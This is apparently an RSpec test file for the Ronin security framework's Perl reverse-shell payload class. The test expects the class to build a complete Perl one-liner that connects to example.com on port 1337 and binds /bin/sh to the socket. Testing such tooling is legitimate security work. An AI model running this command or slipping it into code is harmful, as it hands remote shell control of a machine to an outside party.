require 'spec_helper'
require 'ronin/payloads/builtin/command/perl/reverse_shell'

describe Ronin::Payloads::Command::Perl::ReverseShell do
  it "must inherit from Ronin::Payloads::CommandPayload" do
    expect(described_class).to be < Ronin::Payloads::CommandPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'command/perl/reverse_shell'" do
      expect(subject.id).to eq('command/perl/reverse_shell')
    end
  end

  let(:host) { 'example.com' }
  let(:port) { 1337 }

  subject do
    described_class.new(
      params: {
        host: host,
        port: port
      }
    )
  end

  describe "#build" do
    before { subject.build }

    it "must build an `perl` command that connects back to the host and port params" do
      expect(subject.payload).to eq(
        %{perl -e 'use Socket;$i=#{host.dump};$p=#{port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'}
      )
    end
  end
end
